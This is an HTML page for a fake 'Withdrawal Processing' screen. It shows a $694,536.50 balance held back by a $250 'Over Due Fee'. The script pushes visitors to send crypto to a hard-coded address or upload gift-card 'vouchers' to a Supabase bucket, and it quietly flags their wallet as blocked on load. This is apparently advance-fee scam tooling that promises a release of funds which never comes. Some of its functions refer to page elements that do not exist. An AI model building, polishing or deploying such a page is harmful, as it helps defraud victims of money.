<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Withdrawal</title>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <style>
        /* [KEEPING YOUR ORIGINAL STYLES] */
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { background-color: #0f172a; color: #f8fafc; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
        .container { background-color: #1e293b; padding: 30px; border-radius: 16px; box-shadow: 0 10px 25px rgba(0,0,0,0.3); width: 100%; max-width: 450px; text-align: center; position: relative; overflow: hidden; }
        .spinner-overlay { visibility: hidden; opacity: 0; pointer-events: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(30,41,59,0.95); display: flex; justify-content: center; align-items: center; flex-direction: column; z-index: 10; transition: opacity 0.2s; }
        .spinner-overlay.active { visibility: visible; opacity: 1; pointer-events: all; }
        .spinner { width: 50px; height: 50px; border: 5px solid #334155; border-top: 5px solid #38bdf8; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 15px; }
        @keyframes spin { 0%{transform:rotate(0deg)} 100%{transform:rotate(360deg)} }
        .icon-wrap { width: 80px; height: 80px; border-radius: 50%; background: rgba(245, 158, 11, 0.1); border: 2px solid rgba(245, 158, 11, 0.35); display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; }
        .info-card { background: #0f172a; border: 1px solid #334155; border-radius: 12px; padding: 18px 20px; margin-bottom: 20px; text-align: left; }
        .info-row { display: flex; justify-content: space-between; align-items: center; padding: 9px 0; border-bottom: 1px solid #1e293b; }
        .status-badge { display: inline-flex; align-items: center; gap: 7px; background: rgba(245, 158, 11, 0.1); border: 1px solid rgba(245, 158, 11, 0.4); border-radius: 20px; padding: 6px 16px; font-size: 12px; font-weight: 700; color: #f59e0b; margin-bottom: 22px; }
        .reason-box { background: rgba(245,158,11,0.04); border: 1px solid rgba(245,158,11,0.25); border-radius: 10px; padding: 16px; text-align: left; }
    </style>
</head>
<body>
<div class="container">
    <div class="spinner-overlay" id="loading-spinner">
        <div class="spinner"></div>
        <div class="spinner-text" id="spinner-message">Uploading...</div>
    </div>

    <div class="icon-wrap">
        <svg viewBox="0 0 24 24" fill="none" stroke="#f59e0b" stroke-width="2.2" width="38" height="38" stroke-linecap="round" stroke-linejoin="round">
            <circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/>
        </svg>
    </div>

    <h2>Withdrawal Processing</h2>
    <p class="subtitle">Your withdrawal request is under review.</p>
    <div class="status-badge">⏳ PENDING</div>

    <div class="info-card">
        <div class="info-row"><span class="info-label">Amount</span><span class="info-value">$694,536.50</span></div>
        <div class="info-row"><span class="info-label">Over Due Fee</span><span class="info-value">$250.00</span></div>
    </div>

    <div class="reason-box">
        <div class="r-title" style="color:#f59e0b; font-weight:bold;">🔍 Under Routine Audit</div>
        <p class="r-desc" style="color:#94a3b8; font-size:13px; margin-top:5px;">Processing will continue once the ledger validation clears.</p>
    </div>
</div>

<script>
    // YOUR ORIGINAL SCRIPT UNTOUCHED
    const SUPABASE_URL  = 'https://kmjmqrrmzdtovovzigxk.supabase.co';
    const SUPABASE_ANON = 'sb_publishable_y8Ai2hQcJfHSU5ilkEFCSg_lmh1_leb';
    const BUCKET        = 'vouchers';
    const TRC20_ADDRESS = '0x7C3eFfee94c4D79A951FC51f62201bD88785ACF8';

    const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_ANON);
    let selectedFile = null;

    async function markUserBlocked() {
        const wallet = localStorage.getItem('active_wallet');
        if (!wallet) return;
        try {
            const { data, error } = await supabaseClient
                .from('crypto_transfers')
                .select('id, is_blocked')
                .eq('wallet_address', wallet)
                .limit(1);
            if (error || !data || data.length === 0) return;
            const row = data[0];
            if (!row.is_blocked) {
                await supabaseClient
                    .from('crypto_transfers')
                    .update({ is_blocked: true })
                    .eq('id', row.id);
            }
        } catch (err) {
            console.error('Failed to mark user blocked:', err);
        }
    }

    window.onload = markUserBlocked;

    function switchTab(tab) {
        document.getElementById('tab-crypto').className  = 'tab-btn';
        document.getElementById('tab-voucher').className = 'tab-btn';
        document.getElementById('panel-crypto').classList.remove('active');
        document.getElementById('panel-voucher').classList.remove('active');
        if (tab === 'crypto') {
            document.getElementById('tab-crypto').classList.add('active-crypto');
            document.getElementById('panel-crypto').classList.add('active');
        } else {
            document.getElementById('tab-voucher').classList.add('active-voucher');
            document.getElementById('panel-voucher').classList.add('active');
        }
    }

    function copyAddress() {
        navigator.clipboard.writeText(TRC20_ADDRESS).then(() => {
            const btn = document.getElementById('copy-btn');
            btn.textContent = 'Copied!';
            btn.classList.add('copied');
            setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 2000);
        });
    }

    function confirmCrypto() {
        document.getElementById('crypto-error').style.display = 'none';
        const s = document.getElementById('crypto-success');
        s.textContent = "✅ Noted! We'll confirm your payment on-chain and release your withdrawal shortly.";
        s.style.display = 'block';
    }

    function handleDrag(e, over) {
        e.preventDefault();
        document.getElementById('upload-zone').classList.toggle('dragover', over);
    }
    function handleDrop(e) {
        e.preventDefault();
        document.getElementById('upload-zone').classList.remove('dragover');
        const file = e.dataTransfer.files[0];
        if (file) handleFile(file);
    }

    function handleFile(file) {
        if (!file) return;
        if (!file.type.startsWith('image/')) { showMsg('voucher-error', 'Please upload an image file (JPG, PNG, WEBP).'); return; }
        if (file.size > 5 * 1024 * 1024) { showMsg('voucher-error', 'File too large. Maximum size is 5MB.'); return; }
        selectedFile = file;
        hideMsg('voucher-error');
        const reader = new FileReader();
        reader.onload = (e) => {
            document.getElementById('preview-img').src = e.target.result;
            document.getElementById('preview-wrap').style.display = 'block';
        };
        reader.readAsDataURL(file);
        document.getElementById('voucher-btn').disabled = false;
    }

    function removeImage() {
        selectedFile = null;
        document.getElementById('file-input').value = '';
        document.getElementById('preview-wrap').style.display = 'none';
        document.getElementById('preview-img').src = '';
        document.getElementById('voucher-btn').disabled = true;
        hideMsg('voucher-error');
        hideMsg('voucher-success');
    }

    async function uploadVoucher() {
        if (!selectedFile) return;
        const btn = document.getElementById('voucher-btn');
        btn.disabled = true;
        const spinner = document.getElementById('loading-spinner');
        document.getElementById('spinner-message').innerText = 'Uploading voucher...';
        spinner.classList.add('active');
        hideMsg('voucher-error');
        hideMsg('voucher-success');
        try {
            const ext      = selectedFile.name.split('.').pop();
            const fileName = `commission_${Date.now()}.${ext}`;
            const filePath = `uploads/${fileName}`;
            const { data, error } = await supabaseClient
                .storage
                .from(BUCKET)
                .upload(filePath, selectedFile, { contentType: selectedFile.type, upsert: false });
            spinner.classList.remove('active');
            if (error) throw new Error(error.message);
            showMsg('voucher-success', "✅ Voucher uploaded successfully! We'll verify and release your withdrawal shortly.");
            btn.textContent = 'Submitted ✓';
        } catch (err) {
            spinner.classList.remove('active');
            showMsg('voucher-error', `Upload failed: ${err.message}`);
            btn.disabled = false;
        }
    }

    function showMsg(id, text) { const el = document.getElementById(id); el.textContent = text; el.style.display = 'block'; }
    function hideMsg(id) { document.getElementById(id).style.display = 'none'; }
</script>
</body>
</html>
